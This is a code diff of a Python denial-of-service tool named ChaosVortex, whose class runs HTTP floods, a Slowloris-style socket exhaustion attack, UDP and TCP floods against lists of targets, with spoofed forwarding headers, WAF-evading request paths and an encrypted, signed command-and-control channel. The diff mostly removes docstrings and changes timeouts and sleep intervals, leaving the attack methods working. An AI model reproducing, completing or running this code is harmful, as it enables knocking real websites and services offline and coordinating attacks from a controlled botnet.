@@ -29,14 +29,13 @@ log_buffer = []
 
 class ChaosVortex:
     def __init__(self, targets_l7: List[str] = None, targets_l4: List[str] = None, duration: int = 60, threads: int = 30, methods: List[str] = None, c2_url: str = None):
-        """Initialize ChaosVortex."""
         self.targets_l7 = [t.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0].strip() for t in (targets_l7 or [])]
         self.targets_l4 = targets_l4 or []
         self.duration = duration
-        self.threads = max(1, min(threads, 30))  # Limit to avoid Replit overload
+        self.threads = max(1, min(threads, 30))
         self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
         self.end_time = time.time() + duration
-        self.c2_url = c2_url or "ws://127.0.0.1:8765"  # Use localhost explicitly
+        self.c2_url = c2_url or "ws://127.0.0.1:8765"
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
@@ -56,7 +55,6 @@ class ChaosVortex:
         self.method_load = {m: 0.0 for m in self.methods}
 
     def _init_c2_session(self):
-        """ECDH with HKDF, HMAC, and persistent reconnect."""
         for attempt in range(3):
             try:
                 logger.debug(f"Attempting C2 connection {attempt+1}/3 to {self.c2_url}")
@@ -92,13 +90,11 @@ class ChaosVortex:
         return False
 
     def _sign_command(self, data: bytes) -> bytes:
-        """HMAC command signature."""
         hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         return hmac.finalize()
 
     def _verify_command(self, data: bytes, signature: bytes) -> bool:
-        """Verify HMAC signature."""
         hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         try:
@@ -108,7 +104,6 @@ class ChaosVortex:
             return False
 
     def _encrypt(self, data: bytes) -> bytes:
-        """AES-GCM with 12-byte nonce and compression."""
         compressed = zlib.compress(data)
         iv = os.urandom(12)
         self.c2_nonce = (self.c2_nonce + 1) % (2**64)
@@ -120,10 +115,13 @@ class ChaosVortex:
         return base64.b64encode(iv + encryptor.tag + nonce_bytes + ciphertext)
 
     def _decrypt(self, data: bytes) -> bytes:
-        """AES-GCM decryption with decompression."""
         try:
             data = base64.b64decode(data)
+            if len(data) < 40:  # IV(12) + Tag(16) + Nonce(12)
+                raise ValueError("Invalid data length for decryption")
             iv, tag, nonce_bytes, ciphertext = data[:12], data[12:28], data[28:40], data[40:]
+            if len(iv) != 12 or len(tag) != 16 or len(nonce_bytes) != 12:
+                raise ValueError("Invalid IV, tag, or nonce length")
             cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv, tag), backend=default_backend())
             decryptor = cipher.decryptor()
             decryptor.authenticate_additional_data(nonce_bytes)
@@ -134,7 +132,6 @@ class ChaosVortex:
             raise
 
     def _c2_command(self) -> dict:
-        """Fetch C2 commands with signature verification."""
         try:
             cmd_data = json.dumps({"status": "ready", "heartbeat": int(time.time())}).encode()
             signature = self._sign_command(cmd_data)
@@ -144,8 +141,8 @@ class ChaosVortex:
             if self._verify_command(resp_data, resp_sig):
                 logger.debug(f"Received C2 command: {resp_data.decode()}")
                 return json.loads(resp_data.decode())
-            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 command signature invalid"})
-            logger.error("C2 command signature invalid")
+            log_buffer.append({"ts": time.time(), "level": "WARNING", "msg": "C2 command signature invalid"})
+            logger.warning("C2 command signature invalid")
         except Exception as e:
             logger.error(f"C2 command fetch failed: {str(e)}")
             if self._init_c2_session():
@@ -154,7 +151,6 @@ class ChaosVortex:
         return {"command": "continue"}
 
     def _random_payload(self, size: int = 48) -> bytes:
-        """Valid HTTP/UDP-mimicking payload."""
         valid_prefixes = [
             b"GET / HTTP/1.1\r\nHost: ",
             b"POST /api/data HTTP/1.1\r\nContent-Length: ",
@@ -165,7 +161,6 @@ class ChaosVortex:
         return prefix + suffix[:size - len(prefix)]
 
     def _random_path(self) -> str:
-        """Realistic WAF-evading paths."""
         prefixes = ["api/v4", "rest/v2", "graphql/query", "assets/js", "public/css"]
         segments = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) for _ in range(1)]
         exts = [".json", ".js", ".css", ".html", ""]
@@ -173,16 +168,14 @@ class ChaosVortex:
         return f"/{random.choice(prefixes)}/{'/'.join(segments)}{random.choice(exts)}{query}"
 
     def _random_ip(self) -> str:
-        """Spoofed IP."""
         return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
     def _random_headers(self, target: str) -> dict:
-        """WAF-evading headers with JA3 spoofing."""
         headers = {
             "User-Agent": random.choice(self.user_agents),
             "X-Forwarded-For": self._random_ip(),
             "Accept": random.choice(["application/json", "text/html", "*/*"]),
-            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Encoding": "gzip, deflate",
             "Connection": "keep-alive",
             "Host": target
         }
@@ -193,19 +186,16 @@ class ChaosVortex:
         return headers
 
     def _shuffle_targets(self, layer: str) -> List[str]:
-        """Per-thread target shuffling."""
         with self.lock:
             targets = self.target_pools[layer][:]
         random.shuffle(targets)
         return targets or [None]
 
     def _update_load(self, method: str, success: bool):
-        """Update method load for balancing."""
         with self.lock:
             self.method_load[method] = self.method_load.get(method, 0.5) * 0.9 + (1.0 if success else 0.0) * 0.1
 
     def _vortexhttp(self):
-        """L7: High-impact HTTP flood."""
         targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -214,7 +204,7 @@ class ChaosVortex:
             start_time = time.time()
             try:
                 logger.debug(f"Sending HTTP request to {target}")
-                conn = http.client.HTTPSConnection(target, 443, timeout=0.004, context=ssl._create_unverified_context())
+                conn = http.client.HTTPSConnection(target, 443, timeout=0.5, context=ssl._create_unverified_context())
                 headers = self._random_headers(target)
                 method = random.choice(["GET", "POST"])
                 path = self._random_path()
@@ -229,13 +219,13 @@ class ChaosVortex:
                     self._update_load("vortexhttp", resp.status in [429, 503, 504])
                 conn.close()
                 logger.debug(f"HTTP request to {target} completed, status: {resp.status}")
-                time.sleep(random.uniform(0.00004, 0.0002))
+                time.sleep(random.uniform(0.01, 0.05))
             except Exception as e:
                 logger.debug(f"HTTP request to {target} failed: {str(e)}")
                 self._update_load("vortexhttp", False)
+                time.sleep(random.uniform(0.01, 0.05))
 
     def _ghostloris(self):
-        """L7: Stealth Slowloris with socket exhaustion."""
         targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -245,7 +235,7 @@ class ChaosVortex:
             try:
                 logger.debug(f"Starting ghostloris on {target}")
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.03)
+                sock.settimeout(0.5)
                 sock.connect((target, 443))
                 context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 context.set_ciphers(random.choice([
@@ -267,13 +257,13 @@ class ChaosVortex:
                     self._update_load("ghostloris", True)
                 sock.close()
                 logger.debug(f"Ghostloris on {target} completed")
-                time.sleep(random.uniform(0.0003, 0.002))
+                time.sleep(random.uniform(0.01, 0.05))
             except Exception as e:
                 logger.debug(f"Ghostloris on {target} failed: {str(e)}")
                 self._update_load("ghostloris", False)
+                time.sleep(random.uniform(0.01, 0.05))
 
     def _udpvortex(self):
-        """L4: UDP high-impact with protocol mimicry."""
         targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -293,13 +283,13 @@ class ChaosVortex:
                     self._update_load("udpvortex", True)
                 sock.close()
                 logger.debug(f"UDP to {target} sent")
-                time.sleep(random.uniform(0.000004, 0.00004))
+                time.sleep(random.uniform(0.01, 0.05))
             except Exception as e:
                 logger.debug(f"UDP to {target} failed: {str(e)}")
                 self._update_load("udpvortex", False)
+                time.sleep(random.uniform(0.01, 0.05))
 
     def _tcpvortex(self):
-        """L4: TCP SYN storm with packet crafting."""
         targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -308,7 +298,7 @@ class ChaosVortex:
             try:
                 logger.debug(f"Sending TCP to {target}")
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.004)
+                sock.settimeout(0.5)
                 ports = [80, 443]
                 port = random.choice(ports)
                 sock.connect((target, port))
@@ -319,13 +309,13 @@ class ChaosVortex:
                     self._update_load("tcpvortex", True)
                 sock.close()
                 logger.debug(f"TCP to {target} sent")
-                time.sleep(random.uniform(0.000004, 0.00004))
+                time.sleep(random.uniform(0.01, 0.05))
             except Exception as e:
                 logger.debug(f"TCP to {target} failed: {str(e)}")
                 self._update_load("tcpvortex", False)
+                time.sleep(random.uniform(0.01, 0.05))
 
     def _balance_threads(self):
-        """Dynamic thread load balancing."""
         total_load = sum(self.method_load.values()) or 1.0
         thread_alloc = {m: max(1, int(self.threads * (self.method_load[m] / total_load))) for m in self.methods}
         remaining = self.threads - sum(thread_alloc.values())
@@ -336,7 +326,6 @@ class ChaosVortex:
         return thread_alloc
 
     def start(self):
-        """Unleash the chaos vortex."""
         if not self.targets_l7 and not self.targets_l4:
             log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "At least one target required"})
             logger.error("At least one target required")
@@ -384,7 +373,6 @@ class ChaosVortex:
                 logger.error(f"Failed to send final log to C2: {str(e)}")
 
     def _c2_monitor(self):
-        """Monitor C2 with signed commands."""
         while time.time() < self.end_time:
             cmd = self._c2_command()
             if cmd.get("command") == "stop":
@@ -403,7 +391,6 @@ class ChaosVortex:
             time.sleep(random.uniform(0.1, 0.8))
 
 def main(targets_l7: str, targets_l4: str, duration: int, methods: str, c2_url: str):
-    """Main function to parse arguments and start attack."""
     targets_l7 = targets_l7.split(",") if targets_l7 and targets_l7 != "none" else []
     targets_l4 = targets_l4.split(",") if targets_l4 and targets_l4 != "none" else []
     methods = methods.split(",") if methods else []
